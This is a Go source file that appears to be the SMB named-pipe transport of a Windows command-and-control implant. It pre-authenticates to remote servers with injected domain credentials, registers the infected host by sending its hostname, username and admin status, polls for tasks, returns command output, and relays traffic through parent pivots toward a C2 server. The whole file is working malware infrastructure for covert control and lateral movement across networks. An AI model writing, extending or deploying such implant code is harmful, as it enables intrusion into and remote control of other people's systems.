//go:build windows

package agent

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

const (
	NMPWAIT_WAIT_FOREVER = 0xffffffff

	// WNetAddConnection2 resource types
	resourceTypeAny = 0
)

// SMBNetUser / SMBNetPass are compile-time injected credentials used to
// pre-authenticate to the SMB server before opening the named pipe.
// Inject with: -X 'package.SMBNetUser=DOMAIN\user' -X 'package.SMBNetPass=pass'
var (
	SMBNetUser string
	SMBNetPass string
)

// netResource mirrors NETRESOURCEV (NETRESOURCEW) for WNetAddConnection2W.
type netResource struct {
	dwScope       uint32
	dwType        uint32
	dwDisplayType uint32
	dwUsage       uint32
	lpLocalName   uintptr
	lpRemoteName  uintptr
	lpComment     uintptr
	lpProvider    uintptr
}

var (
	procWaitNamedPipeW  = syscall.NewLazyDLL("kernel32.dll").NewProc("WaitNamedPipeW")
	procWNetAddConn2W   = syscall.NewLazyDLL("mpr.dll").NewProc("WNetAddConnection2W")
	procWNetCancelConn2 = syscall.NewLazyDLL("mpr.dll").NewProc("WNetCancelConnection2W")
)

// smbPreAuth establishes an authenticated SMB session to \\server\IPC$ using
// SMBNetUser / SMBNetPass credentials so that subsequent CreateFile calls on
// \\server\pipe\* reuse that session without re-authenticating.
func smbPreAuth(pipePath string) {
	if SMBNetUser == "" || SMBNetPass == "" {
		return
	}
	// Extract \\server from \\server\pipe\name
	parts := strings.SplitN(pipePath, `\`, 5)
	// parts[0]="" parts[1]="" parts[2]=server parts[3]=pipe parts[4]=name
	if len(parts) < 3 || parts[2] == "." {
		return // local pipe, no auth needed
	}
	server := `\\` + parts[2]
	ipcPath := server + `\IPC$`

	lpRemote, err := syscall.UTF16PtrFromString(ipcPath)
	if err != nil {
		return
	}
	lpUser, err := syscall.UTF16PtrFromString(SMBNetUser)
	if err != nil {
		return
	}
	lpPass, err := syscall.UTF16PtrFromString(SMBNetPass)
	if err != nil {
		return
	}
	nr := netResource{
		dwType:       resourceTypeAny,
		lpRemoteName: uintptr(unsafe.Pointer(lpRemote)),
	}
	// Try to cancel any existing (failed) connection first
	lpServerW, _ := syscall.UTF16PtrFromString(ipcPath)
	procWNetCancelConn2.Call(uintptr(unsafe.Pointer(lpServerW)), 0, 1)
	// Establish new authenticated connection
	procWNetAddConn2W.Call(
		uintptr(unsafe.Pointer(&nr)),
		uintptr(unsafe.Pointer(lpPass)),
		uintptr(unsafe.Pointer(lpUser)),
		0,
	)
}

type pipeConn struct {
	handle syscall.Handle
}

func (p *pipeConn) Read(b []byte) (int, error) {
	var n uint32
	err := syscall.ReadFile(p.handle, b, &n, nil)
	return int(n), err
}

func (p *pipeConn) Write(b []byte) (int, error) {
	var n uint32
	err := syscall.WriteFile(p.handle, b, &n, nil)
	return int(n), err
}

func (p *pipeConn) Close() error { return syscall.CloseHandle(p.handle) }

func pipeReadMsg(p *pipeConn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(p, hdr); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(hdr)
	if n == 0 || n > 10<<20 {
		return nil, fmt.Errorf("invalid msg len: %d", n)
	}
	buf := make([]byte, n)
	_, err := io.ReadFull(p, buf)
	return buf, err
}

func pipeWriteMsg(p *pipeConn, data []byte) error {
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
	if _, err := p.Write(hdr); err != nil {
		return err
	}
	_, err := p.Write(data)
	return err
}

type smbClientTransport struct {
	pipe    *pipeConn
	agentID string
	aesKey  []byte
	mu      sync.Mutex // serializes all pipe operations (beacon, result, relay)
}

func newSMBTransport(pipeName string) (*smbClientTransport, error) {
	// Only normalise to local-pipe format when pipeName is not already a UNC
	// path (\\server\pipe\name) or a local device path (\\.\pipe\name).
	if len(pipeName) < 2 || pipeName[:2] != `\\` {
		pipeName = `\\.\pipe\` + pipeName
	}
	// Pre-authenticate to the remote SMB server if credentials are provided.
	smbPreAuth(pipeName)
	pipeW, err := syscall.UTF16PtrFromString(pipeName)
	if err != nil {
		return nil, err
	}
	procWaitNamedPipeW.Call(uintptr(unsafe.Pointer(pipeW)), uintptr(NMPWAIT_WAIT_FOREVER))
	h, err := syscall.CreateFile(pipeW,
		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
		0, nil, syscall.OPEN_EXISTING, 0, 0)
	if err != nil {
		return nil, fmt.Errorf("open pipe %s: %w", pipeName, err)
	}
	return &smbClientTransport{pipe: &pipeConn{handle: h}}, nil
}

func (t *smbClientTransport) register(info sysInfo) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]any{
		"type": "REGISTER", "hostname": info.Hostname,
		"username": info.Username, "os": info.OS, "pid": info.PID,
		"is_admin": info.IsAdmin,
	}
	data, _ := json.Marshal(req)
	if err := pipeWriteMsg(t.pipe, data); err != nil {
		return err
	}
	resp, err := pipeReadMsg(t.pipe)
	if err != nil {
		return err
	}
	var reg struct {
		AgentID string `json:"agent_id"`
		AESKey  string `json:"aes_key"`
	}
	if err := json.Unmarshal(resp, &reg); err != nil {
		return err
	}
	t.agentID = reg.AgentID
	t.aesKey, _ = base64.StdEncoding.DecodeString(reg.AESKey)
	return nil
}

func (t *smbClientTransport) beacon() ([]taskWire, error) {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]string{"type": "BEACON", "agent_id": t.agentID}
	data, _ := json.Marshal(req)
	if err := pipeWriteMsg(t.pipe, data); err != nil {
		return nil, err
	}
	resp, err := pipeReadMsg(t.pipe)
	if err != nil {
		return nil, err
	}
	if len(resp) == 0 || string(resp) == "null" {
		return nil, nil
	}
	var tasks []taskWire
	json.Unmarshal(resp, &tasks)
	return tasks, nil
}

func (t *smbClientTransport) sendResultAdmin(taskID int64, output, errStr string, isAdmin bool) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]any{
		"type": "RESULT", "task_id": taskID,
		"output": output, "error": errStr, "agent_id": t.agentID,
		"is_admin": isAdmin,
	}
	data, _ := json.Marshal(req)
	return pipeWriteMsg(t.pipe, data)
}

func (t *smbClientTransport) sendResult(taskID int64, output, errStr string) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]any{
		"type": "RESULT", "task_id": taskID,
		"output": output, "error": errStr, "agent_id": t.agentID,
	}
	data, _ := json.Marshal(req)
	return pipeWriteMsg(t.pipe, data)
}

// rawForward sends a RELAY request to the parent pivot and returns the HTTP response.
// This enables N-hop pivot chaining: SMB agent → parent pivot → C2.
func (t *smbClientTransport) rawForward(method, path string, body []byte) (int, []byte, error) {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]any{
		"type":     "RELAY",
		"method":   method,
		"path":     path,
		"body_b64": base64.StdEncoding.EncodeToString(body),
	}
	data, _ := json.Marshal(req)
	if err := pipeWriteMsg(t.pipe, data); err != nil {
		return 0, nil, err
	}
	resp, err := pipeReadMsg(t.pipe)
	if err != nil {
		return 0, nil, err
	}
	var r struct {
		Status int    `json:"status"`
		Body   string `json:"body_b64"`
	}
	if err := json.Unmarshal(resp, &r); err != nil {
		return 0, nil, err
	}
	bodyBytes, _ := base64.StdEncoding.DecodeString(r.Body)
	return r.Status, bodyBytes, nil
}

func (t *smbClientTransport) uploadFile(_ int64, _ string, _ []byte) error {
	return fmt.Errorf("SMB: uploadFile not supported")
}

func (t *smbClientTransport) downloadFile(_ string) ([]byte, error) {
	return nil, fmt.Errorf("SMB: downloadFile not supported")
}
